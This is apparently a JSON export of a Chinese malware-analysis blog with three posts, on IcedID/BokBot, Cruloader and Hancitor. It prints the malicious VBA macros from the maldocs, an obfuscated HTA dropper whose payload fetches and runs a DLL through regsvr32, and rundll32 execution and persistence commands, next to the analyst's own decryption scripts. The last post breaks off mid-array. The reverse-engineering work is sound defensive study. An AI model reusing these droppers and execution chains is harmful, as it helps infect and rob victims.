{"pages":[{"title":"友情链接","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 45%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } 4xwi11’s blog 可恶的密码师傅 J1ang’s blog 爱如潮水，笔墨生花 葵子's blog 正在努力让自己看起来不那么菜，进度0.1/n pz’s blog 进击的逆向手 307’s blog 摸鱼cry手 Jasontt’s blog 大帅逼肾透带师 De3B4t0’s blog dbttttt","link":"/links/index.html"},{"title":"About me","text":"V&amp;N Team , Aiming for learning Reverse Engineering in Virus","link":"/about/index.html"}],"posts":[{"title":"bokbot-analysis","text":"2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNChttps://www.malware-traffic-analysis.net/2021/12/10/index.html 邮件附件带有加密的压缩包，密码为ujy55 1python oledump.py -s a -v rule.12.21.doc 得到代码 12345678910111213141516171819202122232425262728Attribute VB_Name = &quot;ThisDocument&quot;Attribute VB_Base = &quot;1Normal.ThisDocument&quot;Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = TrueAttribute VB_Customizable = TrueFunction contents()ActiveDocument.Content.Find.Execute FindText:=&quot;x8&quot;, ReplaceWith:=&quot;&quot;, Replace:=2End FunctionFunction text1(doorLikeLike)text1 = ActiveDocument.BuiltInDocumentProperties(doorLikeLike).ValuecontentsEnd FunctionPublic Function s(likeLikeLoad, karolNextLove)CreateObject(text1(&quot;category&quot;)).exec &quot;c:\\windows\\explorer &quot; + karolNextLoveEnd FunctionAttribute VB_Name = &quot;main&quot;Public Sub autoopen()youTubePow = StrReverse(ThisDocument.text1(&quot;keywords&quot;))With ActiveDocument.SaveAs FileName:=youTubePow, FileFormat:=2End WithThisDocument.s &quot;&quot;, youTubePowEnd Sub 生成文件likePowLike.hta 那么我们文件的生成其实是一个解混淆的方法 123Function contents()ActiveDocument.Content.Find.Execute FindText:=&quot;x8&quot;, ReplaceWith:=&quot;&quot;, Replace:=2End Function 真正的文本在word中隐藏了，我们全选更改颜色后即可显示出来。 得到文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;body&gt; &lt;p id=&quot;doorLikeGirl&quot; style=&quot;font-color: #000&quot;&gt;eval&lt;/p&gt; &lt;p id=&quot;dowGirlDow&quot; style=&quot;font-color: #000&quot;&gt; fX17KWUoaGN0YWN9O2Vzb2xjLmVraUxkYW9MZXZvbDspMiAsImdwai5kYW9MZWtpTGRhb2xcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLmVraUxkYW9MZXZvbDspeWRvYmVzbm9wc2VyLmVidVRyb29EdW95KGV0aXJ3LmVraUxkYW9MZXZvbDsxID0gZXB5dC5la2lMZGFvTGV2b2w7bmVwby5la2lMZGFvTGV2b2w7KSJtYWVydHMuYmRvZGEiKHRjZWpiT1hldml0Y0Egd2VuID0gZWtpTGRhb0xldm9sIHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMuZWJ1VHJvb0R1b3koZmk7KShkbmVzLmVidVRyb29EdW95Oyllc2xhZiAsIlVNdzVpdmN4NXk2WU9Cd049cmVzdSZUSE14R3BJYjVjPXEmNENiTnlvQnFJSnVoMms5TEFqbU1UbG49JjF6bUl4RDVRSlNIRVNHY2lMWDlxPWRpYyZkbDNYaTZjb1FJcW92dGJacWFrSGkyanplVTA3PWRpJm91Y0hVQ0gwSHM9ZW1pdCZGaTVMb3NhQWk0ak94VnFZTGhXNjlXST1lZ2FwJmNUc0toNmRabnBKRD1lZ2FwJllIVmVPZUgwcHBHYXg3cW89cmVzdT83YXBlci81aEw4eTJXc0dYWXNMclZoenBqQi85ejJUMFFKSVNBaURqcVo0a3hCVXVBcXpOSWRYTS90dW1vMnJGUDJHSG1uSjZpdUMwb2ZTNlg1eHdKVDhXMjVIdkN5L05KbWNrdTEvZWhyZi9tb2MuZ3RpZmVuZWJkbmFsZXBvYy8vOnB0dGgiICwiVEVHIihuZXBvLmVidVRyb29EdW95OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gZWJ1VHJvb0R1b3kgcmF2---OykiZ3BqLmRhb0xla2lMZGFvbFxcY2lsYnVwXFxzcmVzdVxcOmMgMjNydnNnZXIiKG51ci5yb29Ed29QbHJpZzspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVidVRldm9Md29kIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gcm9vRHdvUGxyaWcgcmF2 &lt;/p&gt; &lt;p id=&quot;nextLoveLove&quot; style=&quot;font-color: #fff&quot;&gt; ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= &lt;/p&gt; &lt;script language=&quot;javascript&quot;&gt; function likeTubeDoor(loadPowGirl) { return new ActiveXObject(loadPowGirl); } function loadDowNext(karolLoadLike) { return likeNextLoad.getElementById(karolLoadLike).innerHTML; } function karolKarolLike(loadLikePow) { return &quot;cha&quot; + loadLikePow; } function doorDowKarol(likeLoveGirl) { var doorPowNext = loadDowNext(&quot;nextLoveLove&quot;); var likeLikeLike = &quot;&quot;; var dowPowYou, tubeDoorLoad, doorLikePow; var girlLoadNext, youGirlDoor, nextDoorPow, loadNextLike; var youLoveLoad = 0; likeLoveGirl = likeLoveGirl.replace(/[^A-Za-z0-9\\+\\/\\=]/g, &quot;&quot;); while (youLoveLoad &lt; likeLoveGirl.length) { girlLoadNext = doorPowNext.indexOf( likeLoveGirl.charAt(youLoveLoad++) ); youGirlDoor = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++)); nextDoorPow = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++)); loadNextLike = doorPowNext.indexOf( likeLoveGirl.charAt(youLoveLoad++) ); dowPowYou = (girlLoadNext &lt;&lt; 2) | (youGirlDoor &gt;&gt; 4); tubeDoorLoad = ((youGirlDoor &amp; 15) &lt;&lt; 4) | (nextDoorPow &gt;&gt; 2); doorLikePow = ((nextDoorPow &amp; 3) &lt;&lt; 6) | loadNextLike; likeLikeLike = likeLikeLike + String.fromCharCode(dowPowYou); if (nextDoorPow != 64) { likeLikeLike = likeLikeLike + String.fromCharCode(tubeDoorLoad); } if (loadNextLike != 64) { likeLikeLike = likeLikeLike + String.fromCharCode(doorLikePow); } } return likeLikeLike; } function loadLikeDow(girlPowYou) { return girlPowYou.split(&quot;&quot;).reverse().join(&quot;&quot;); } function loveGirlDow(loadLikePow) { return loadLikeDow(doorDowKarol(loadLikePow)); } function doorYouTube(loadLikePow, loadDoorPow) { return loadLikePow.split(loadDoorPow); } likeDoorKarol = window; likeNextLoad = document; likeDoorKarol[&quot;moveTo&quot;](-101, -102); var youDowLoad = loadDowNext(&quot;dowGirlDow&quot;).split(&quot;---&quot;); var doorTubeLoad = loveGirlDow(youDowLoad[0]); var loadLoadGirl = loveGirlDow(youDowLoad[1]); &lt;/script&gt; &lt;script language=&quot;javascript&quot;&gt; function doorPowKarol(nextLoadYou) { likeDoorKarol[loadDowNext(&quot;doorLikeGirl&quot;)](nextLoadYou); } &lt;/script&gt; &lt;script language=&quot;vbscript&quot;&gt; Call doorPowKarol(doorTubeLoad) : Call doorPowKarol(loadLoadGirl) &lt;/script&gt; &lt;script language=&quot;javascript&quot;&gt; likeDoorKarol[&quot;close&quot;](); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 那么很明显是一个base64解密的过程，我们直接拿出来解密得到攻击代码 从这个代码中可以得到loadLikeLoad.jpg,然后使用regsvr32 执行该文件,可以知道此为dll 12file loadLikeLoad.jpgloadLikeLoad.jpg: PE32+ executable (DLL) (native) x86-64, for MS Windows first 得到PE文件 那么是如何调用PE的呢？我们可以在函数中找到call eax 调用了dllmain函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697int __cdecl main(int argc, const char **argv, const char **envp){ unsigned __int64 v3; // rbx __int64 v4; // rdi unsigned __int64 v5; // rax unsigned int v6; // eax __int64 v7; // rax unsigned int v8; // eax void *v9; // rbx unsigned int v10; // edi HANDLE ProcessHeap; // rax __int64 v12; // rax CHAR v14[32]; // [rsp+20h] [rbp-49h] BYREF char v15[64]; // [rsp+40h] [rbp-29h] BYREF unsigned int v16; // [rsp+80h] [rbp+17h] char v17[60]; // [rsp+84h] [rbp+1Bh] BYREF LPVOID lpMem; // [rsp+D0h] [rbp+67h] BYREF unsigned __int64 v19; // [rsp+D8h] [rbp+6Fh] BYREF v3 = 0i64; v4 = 4i64; do { v5 = __rdtsc(); v3 = v5 | (v3 &lt;&lt; 16); Sleep(v3 &amp; 15); --v4; } while ( v4 ); wsprintfA(v14, &quot;%016IX&quot;, v3); decrypt(v15); v6 = sub_242A40(); v7 = sub_24160C(v16, v6, v14); if ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= 0x400 ) { v8 = sub_24233C(lpMem); v9 = lpMem; v10 = v8; if ( lpMem ) { ProcessHeap = GetProcessHeap(); HeapFree(ProcessHeap, 0, v9); } v12 = sub_2422C4(v14, v10); if ( v12 ) sub_241828(v17, v12); } return 0;}int __cdecl main(int argc, const char **argv, const char **envp){ unsigned __int64 v3; // rbx __int64 v4; // rdi unsigned __int64 v5; // rax unsigned int v6; // eax __int64 v7; // rax unsigned int v8; // eax void *v9; // rbx unsigned int v10; // edi HANDLE ProcessHeap; // rax __int64 v12; // rax CHAR v14[32]; // [rsp+20h] [rbp-49h] BYREF char v15[64]; // [rsp+40h] [rbp-29h] BYREF unsigned int v16; // [rsp+80h] [rbp+17h] char v17[60]; // [rsp+84h] [rbp+1Bh] BYREF LPVOID lpMem; // [rsp+D0h] [rbp+67h] BYREF unsigned __int64 v19; // [rsp+D8h] [rbp+6Fh] BYREF v3 = 0i64; v4 = 4i64; do { v5 = __rdtsc(); v3 = v5 | (v3 &lt;&lt; 16); Sleep(v3 &amp; 15); --v4; } while ( v4 ); wsprintfA(v14, &quot;%016IX&quot;, v3); decrypt(v15); v6 = sub_242A40(); v7 = sub_24160C(v16, v6, v14); if ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= 0x400 ) { v8 = sub_24233C(lpMem); v9 = lpMem; v10 = v8; if ( lpMem ) { ProcessHeap = GetProcessHeap(); HeapFree(ProcessHeap, 0, v9); } v12 = sub_2422C4(v14, v10); if ( v12 ) sub_241828(v17, v12); } return 0;} 其中有一个加密数据段，保存了访问的url地址 解密后得到地址如下 next get url这个dll的作用是下载持久化dll，当我们运行该dll时 1&quot;C:\\Windows\\System32\\rundll32.exe&quot; &quot;C:\\Users\\Scr1pt\\Desktop\\1\\gg.dll&quot; #1 首先会去访问aws.amazon.com 然后会去访问主机获得IcedID installer 也即是2021-12-10-binary-from-jeliskvosh.com.bin文件,gziploader解密。 然后利用rundll32.exe [filename],DllMain --fi=&quot;[path to license.dat]&quot;去调用license.dat持久化 1&quot;C:\\Windows\\System32\\rundll32.exe&quot; &quot;C:\\Users\\Scr1pt\\Desktop\\WrongEvolve\\usage_x32.dat&quot;,DllMain --fi=&quot;C:\\Users\\Scr1pt\\Desktop\\WrongEvolve\\license.dat&quot; 原先预想调试一下，发现run不起来，望有大佬赐教。 decrypt license.dat利用Binary Defender编写的脚本进行解密 1python3 IceDecrypt.py -f license.dat 得到解密后的dll文件，后续就是窃取电脑上的各类信息了。 有大量的加密数据，其实是通过rol、ror进行加密的，我们进行解密即可得到原数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import structfrom malduck import xorfrom malduck.bits import rol, rorimport ida_bytesdef generate_round_key(seed): # .text:0000000180015B00 decrypt_string_shifting proc near ; CODE XREF: decrypt_string+65↑p # .text:0000000180015B00 ; sub_18000A56C+117↑p ... # .text:0000000180015B00 lea eax, [rcx+2E59h] # .text:0000000180015B06 ror eax, 1 # .text:0000000180015B08 ror eax, 1 # .text:0000000180015B0A ror eax, 2 # .text:0000000180015B0D xor eax, 151Dh # .text:0000000180015B12 rol eax, 2 # .text:0000000180015B15 rol eax, 1 # .text:0000000180015B17 retn # .text:0000000180015B17 decrypt_string_shifting endp eax = seed + 0x2E59 eax = ror(eax, 1) eax = ror(eax, 1) eax = ror(eax, 2) eax = struct.unpack(&quot;I&quot;, xor(struct.pack(&quot;I&quot;, eax)[0:2], struct.pack(&quot;H&quot;, 0x151D)) + struct.pack(&quot;I&quot;, eax)[2:4])[0] eax = rol(eax, 2) eax = rol(eax, 1) return eaxdef decrypt_string(offset): b = ida_bytes.get_bytes(offset, 0x200) str_size = struct.unpack(&quot;H&quot;, xor(b[4:6], b[0:2]))[0] xor_key_index = 6 decrypted_string = &quot;&quot; seed = ida_bytes.get_dword(offset) for current_offset in range(str_size): seed = generate_round_key(seed) current_dec_chr = b[xor_key_index] ^ (seed &amp; 0xFF) xor_key_index += 1 decrypted_string += chr(current_dec_chr) return decrypted_string# This is an example script that implements the core decryption# algorithm of current IcedID samples.start = 0x1800207C0end = 0x180026366f = open('outString.txt','w')for i in range(start,end): try: f.write(decrypt_string(i)) #print(decrypt_string(i)) except: continue 解密出来字符串如下，可以看出是一些对浏览器数据库的读取，headers的设置，邮件信息等的窃取。","link":"/2022/03/23/bokbot-analysis/"},{"title":"cruloader","text":"Cruloader1th Stage一到main函数就是一个加密函数，我们编写脚本去恢复 加密函数如下 那么编写解密脚本并patch上去 12345678910111213141516171819202122232425262728293031table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./='def decode(enc): result = '' for i in range(len(enc)): ind = table.index(enc[i]) + 13 if ind &gt;= len(table): ind -= len(table) result +=table[ind] return resultif __name__ == '__main__': ea_start = 0x00414880 ea_end = 0x00414980 count = 0 tt = b'' for ea in range(ea_start,ea_end): temp = ida_bytes.get_bytes(ea,1) if ord(temp) == 0 or ord(temp) == 10: if tt !=b'': dec_str = decode(tt.decode()) ida_bytes.patch_bytes(ea-len(tt),dec_str.encode()) tt = b'' ea_start = ea else: count += 1 tt += temp print('ok') 然后发现Resource中保存有一些加密数据 对应的解密代码段如下，是一个RC4加密的代码段，key为加密代码段的第12byte后的16byte。 解密的数据为key后面的数据,key为kkd5YdPM24VBXmi 2th Stage进一步分析，恶意代码执行流程如下 检测反调试 --&gt; 检测进程列表 --&gt; 装载所需的api函数 --&gt; 创建进程svchost.exe --&gt; 把本进程代码注入到svchost.exe中 导入注入所需的函数 导入函数使用crc32加密 3th Stage创建进程 远程代码注入 断点命中 首先导入wininet.dll 解密得到url并进行访问 代码是存放在原PE的，我们可以直接找到逻辑 对应的解密逻辑 cyberchef 1https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Rotate_left(4,false)XOR(%7B'option':'Decimal','string':'197'%7D,'Standard',false)&amp;input=REExQjFCNUI2QkZGQUVBRTVCNEE2QjFCMEE3QUNBQkFCRTZBQUE4QUFFN0I0QTJCQUU4QTk4MEE4QUNGMTgyOA 访问得到png，再通过访问得到png的数据 然后virtualAlloc申请空间写入PNG 4th Stage解密得到弹窗的PE代码，但是已经无法解密了（原作者脚本失效） tipsida python脚本编写 由于汇编指令格式如下 得到所有函数的crc32表 根据交叉引用和crc32表进行过匹配 输入 comment 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import pefile, os, re, binasciidlls_list = [&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, &quot;wininet.dll&quot;]#Get the list of all functions inside the dlldef get_functions(dll_path): pe = pefile.PE(dll_path) if ((not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT')) or (pe.DIRECTORY_ENTRY_EXPORT is None)): print(f&quot;[*] No exports for {dll_path}&quot;) return [] else: expname = [] for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: if exp.name: expname.append(exp.name) return expname# Hash the function namedef calc_crc32(string): return int(binascii.crc32(string) &amp; 0xFFFFFFFF)# Generate CRC32 lookup tablewin_path = os.environ['WINDIR']system32_path = os.path.join(win_path, &quot;system32&quot;)data = {}for dll in dlls_list: dll_path = os.path.join(system32_path, dll) dll_name = dll.split(&quot;.&quot;)[0].lower() if os.path.isfile(dll_path): for f in get_functions(dll_path): f_name = re.sub(r'\\W+', '_', f.decode('utf-8')) name = &quot;func_&quot;+dll_name + &quot;_&quot; + f_name.lower() data[calc_crc32(f)] = name print(f&quot;[+] Generated functions for {dll_path}&quot;) else: print(f&quot;[*] File not found: {dll_path}&quot;)# List all Xref to the function, retrieve the content of edx (where the crc32 hash is) and compare it to our crc32 lookup table. A comment is set if there is a hitfor xref in XrefsTo(get_name_ea_simple(&quot;f_getProcAddr&quot;)): currentAddress = 0 ea = xref.frm for i in range(0,20): mnem = print_insn_mnem(prev_head(ea-i)) if mnem == &quot;mov&quot;: if print_operand(prev_head(ea-i), 0) == &quot;edx&quot;: crc32_value = print_operand(prev_head(ea-i), 1) crc32_value = int(crc32_value[:-1], 16) for k, v in data.items(): if k == crc32_value: set_cmt(xref.frm, v, 0) break 解密函数 对应着 https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Rotate_left(4,false)XOR(%7B'option':'Decimal','string':'162'%7D,'Standard',false)Reverse('Character')&amp;input=N0M2RDFEQkQxRkVGMUQ1RERDNkNDQ0JDNUZFRjg5MUVo summary收获主要是实现了新线程断点，解决了之前的痛点。熟悉了crc32算法，利用cyberchef解rol，学习了利用交叉引用注释提高代码辨识度的ida python脚本。 缺陷在于仍然无法看懂这段代码，即无法实现静态分析解密处png图片的payload，留坑。","link":"/2022/03/23/cruloader/"},{"title":"2021-09-02 hancitor","text":"2021-09-02 (THURSDAY) - HANCITOR (CHANITOR/MAN1/MOSKALVZAPOE/TA511) WITH COBALT STRIKE (BEACON)Timeline Initial Access首先我们得到了钓鱼邮件。 我们在邮件中得到了一个html文件，也许在邮箱中它会直接显示为html格式，并诱导点击See Document。该按钮的导向链接为feedproxy.google.com/r/wgildewqw/3/DFuCIekYsNE/saintdom.php 下面是一个感染启动方式，由于链接已经挂掉了，我们直接利用现成的word文档进行分析。 1Please visit DocuSign, click on 'Access Documents', and enter the security code: E8A9CA9AF4 word此单个分页文档包含一个具有指令的图片，试图引诱受害者进入宏，以启动vbs恶意宏代码。 我们利用oledump进行宏代码的提取 1234567891011121314151617Attribute VB_Name = &quot;Module1&quot;Sub pppx(spoc As String) Documents.Open FileName:=spoc, ConfirmConversions:=False, ReadOnly:= _ False, AddToRecentFiles:=False, PasswordDocument:=&quot;123321&quot;, _ PasswordTemplate:=&quot;&quot;, Revert:=False, WritePasswordDocument:=&quot;&quot;, _ WritePasswordTemplate:=&quot;&quot;, Format:=wdOpenFormatAuto, XMLTransform:=&quot;&quot;End SubSub ousx()Call uoia(Options.DefaultFilePath(wdUserTemplatesPath))End Sub 1234567891011121314151617181920212223242526272829303132333435363738Attribute VB_Name = &quot;Module123345&quot;Dim pls As String Sub Search(mds As Object, pafs As String) Dim Nedc As Object Dim Ters As Object Dim fffff fffff = &quot;gl&quot; &amp; &quot;ib.b&quot; &amp; &quot;a&quot; &amp; &quot;x&quot;For Each Nedc In mds.SubFolders Search Nedc, pafs Next Nedc For Each Ters In mds.Files If Ters.Name = fffff Then pafs = Ters End If Next Ters Exit SubErrHandle: Err.ClearEnd SubSub nam(pafs As String)Call ousxDim oxloxl = &quot;\\gl&quot; &amp; &quot;ib.d&quot; &amp; &quot;o&quot; &amp; &quot;c&quot;Name pafs As pls &amp; oxlEnd SubSub uoia(fffs As String)pls = fffsEnd Sub 123456789101112131415161718192021222324252627Attribute VB_Name = &quot;Module3&quot;Sub bvxfcsd()Dim uuuucuuuuc = Options.DefaultFilePath(wdUserTemplatesPath)Dim ewrwsdf As Stringewrwsdf = &quot;L&quot; &amp; &quot;oc&quot; &amp; &quot;a&quot; &amp; &quot;l&quot;ewrwsdf = ewrwsdf &amp; &quot;/&quot; &amp; &quot;Temp&quot; ntgs = 50sda = 49Dim kuls As Stringkuls = ewrwsdfWhile sda &lt; 50 ntgs = ntgs - 1 If Dir(Left(uuuuc, ntgs) &amp; kuls, vbDirectory) = &quot;&quot; Then Else sda = 61 End If Wend Call ThisDocument.hdhdd(Left(uuuuc, ntgs) &amp; ewrwsdf)End Sub 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Attribute VB_Name = &quot;ThisDocument&quot;Attribute VB_Base = &quot;1Normal.ThisDocument&quot;Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = TrueAttribute VB_Customizable = TrueOption ExplicitOption Compare Text Dim hdv As String Dim bbbb As String Dim med As StringPrivate Sub Document_Open()Dim dfgdgdgDim kytrewwf As Stringkytrewwf = Options.DefaultFilePath(wdUserTemplatesPath)Dim fdfcc As Stringfdfcc = &quot;.d&quot;If Dir(kytrewwf &amp; &quot;\\gl&quot; &amp; &quot;i&quot; &amp; &quot;b&quot; &amp; fdfcc &amp; &quot;o&quot; &amp; &quot;c&quot;) = &quot;&quot; Then Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.TypeBackspace Selection.Copy Call bvxfcsdIf Len(hdv) &gt; 2 ThenCall nam(hdv) Call pppx(kytrewwf &amp; &quot;\\gl&quot; &amp; &quot;ib.d&quot; &amp; &quot;o&quot; &amp; &quot;c&quot;) ActiveDocument.CloseEnd IfEnd IfEnd SubSub hdhdd(asda As String)Dim MyFSO As FileSystemObjectDim MyFile As FileDim SourceFolder As StringDim DestinationFolder As StringDim MyFolder As FolderDim MySubFolder As FolderSet MyFSO = New Scripting.FileSystemObjectCall Search(MyFSO.GetFolder(asda), hdv)End Sub 阅读源码可以知道这个宏是写了一个密码为123321且文件名为glib.doc的文件。 我们通过虚拟机发现同时生成了一个yefff.dll的文件。 文件路径C:\\Users\\{用户名}\\AppData\\Roaming\\Microsoft\\Templates 我们再次查看glib.doc的ole流。 python .\\oledump.py .\\glib.doc -s b5 -v，可以看到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Option ExplicitOption Compare Text Dim hdv As String Dim bbbb As String Dim med As StringPrivate Sub Document_Open()Dim vcbc As String Dim dfgdgdgbbbb = &quot;rundl&quot;vcbc = Options.DefaultFilePath(wdUserTemplatesPath)If Dir(vcbc &amp; &quot;\\yefff.dll&quot;) = &quot;&quot; Then Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.TypeBackspace Selection.Copy Call bvxfcsdIf Len(hdv) &gt; 2 ThenCall nam(hdv)Dim pattisonpattison = &quot;\\yefff.dll&quot; Dim cvzz As Stringcvzz = &quot;l32&quot; Shell (bbbb &amp; cvzz &amp; &quot; &quot; &amp; vcbc &amp; pattison &amp; &quot;,VVNOUNDWUMR&quot;)End IfEnd IfEnd SubSub hdhdd(asda As String)Dim MyFSO As FileSystemObjectDim MyFile As FileDim SourceFolder As StringDim DestinationFolder As StringDim MyFolder As FolderDim MySubFolder As FolderSet MyFSO = New Scripting.FileSystemObjectCall Search(MyFSO.GetFolder(asda), hdv)End Sub 其实这是执行了VVNOUNDWUMR函数 1rundll32.exe yefff.dll,VVNOUNDWUMR 我们跟进dll文件 hancitorwhat is hancitor1Hancitor is a well-known malware loader that has been observed delivering FickerStealer, Sendsafe, and Cobalt Strike Beacon if the victim targeting conditions are met. In recent months, more threat intelligence has been gathered as to what the attackers’ goals are when Hancitor is used to deliver Cobalt Strike Beacon and, [based on the information shared,](https://blog.group-ib.com/hancitor-cuba-ransomware) it has become apparent that the Cuba Ransomware gang has selected Hancitor as its loader of choice. This means that companies of all sizes need to be sure their cyber defense and detection strategies include the capability to detect behaviors associated with Hancitor. Many ransomware gangs up to this point have chosen Cobalt Strike as their preferred tool to move within an environment, but few malware loaders drop Beacon as quickly as Hancitor. This means that time to detection and response is critical for defenders to avoid damage to systems that they protect. Analysis of Hancitor – When Boring Begets Beacon - Binary Defense unpack我们尝试在export中找到VVNOUNDWUMR函数，奇怪的是其并不存在。那么猜测这是经过了pack。 我们把它扔到unpac.me上进行解密。经过unpack后，会发现火绒已经能识别出这是一个下载者木马hancitor。（我们考虑后期学习手撕这种加壳方式） 扔到ida里面分析一下，对于dll，我们可以通过导出函数或者rdata来寻找异常点。 12VVNOUNDWUMR -&gt;sub_5B1870()0&gt; sub_5B1AA0() -&gt; sub_5B25B0() -&gt; sub_5B2CD0(dword_5B7264, 0x2000u, &amp;pbData, 8u); 找到了加密函数 123456789101112131415161718192021222324252627282930313233343536DWORD __cdecl sub_5B2CD0(BYTE *a1, DWORD pdwDataLen, BYTE *pbData, DWORD dwDataLen){ DWORD v5; // [esp+4h] [ebp-10h] HCRYPTKEY phKey; // [esp+8h] [ebp-Ch] BYREF HCRYPTPROV phProv; // [esp+Ch] [ebp-8h] BYREF HCRYPTHASH phHash; // [esp+10h] [ebp-4h] BYREF phKey = 0; phHash = 0; phProv = 0; v5 = 0; if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) &amp;&amp; CryptCreateHash(phProv, CALG_SHA1, 0, 0, &amp;phHash) &amp;&amp; CryptHashData(phHash, pbData, dwDataLen, 0) &amp;&amp; CryptDeriveKey(phProv, 0x6801u, phHash, 0x280011u, &amp;phKey) &amp;&amp; CryptDecrypt(phKey, 0, 1, 0, a1, &amp;pdwDataLen) ) { v5 = pdwDataLen; } if ( phHash ) { CryptDestroyHash(phHash); phHash = 0; } if ( phKey ) { CryptDestroyKey(phKey); phKey = 0; } if ( phProv ) { CryptReleaseContext(phProv, 0); phProv = 0; } return v5;} 这里有个小tips，我们需要把CryptDeriveKey函数好好看一下。尤其注意它的第四个参数，也就是dwFlags 1234567BOOL CryptDeriveKey( [in] HCRYPTPROV hProv, [in] ALG_ID Algid, [in] HCRYPTHASH hBaseData, [in] DWORD dwFlags, [in, out] HCRYPTKEY *phKey); DWORD类型的dwFlags是八位，值的区域在0x00000000--0xFFFFFFFF。而key的大小取决于前8位数值. 1The key size, representing the length of the key modulus in bits, is set with the upper 16 bits of this parameter. CryptDeriveKey function (wincrypt.h) - Win32 apps | Microsoft Docs 回到我们此处的逻辑 取pbData进行SHA1加密，并取其前五个字符作为key，进行rc4解密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837import hashlibfrom Crypto.Cipher import ARC4pbdata = bytes([ 0x51, 0x89, 0xAD, 0x89, 0xC0, 0xF8, 0x28, 0x3B])enc = [0x20, 0xE8, 0xDD, 0x5C, 0xA4, 0x88, 0x73, 0x81, 0xCD, 0x49, 0x85, 0xB9, 0x9C, 0x9A, 0x36, 0x97, 0xF7, 0x3A, 0x8F, 0x9F, 0xFE, 0xB5, 0xDF, 0x49, 0x41, 0x68, 0x2A, 0x3A, 0x65, 0x42, 0x9C, 0x84, 0x33, 0xE5, 0x28, 0x44, 0x79, 0xDE, 0xC5, 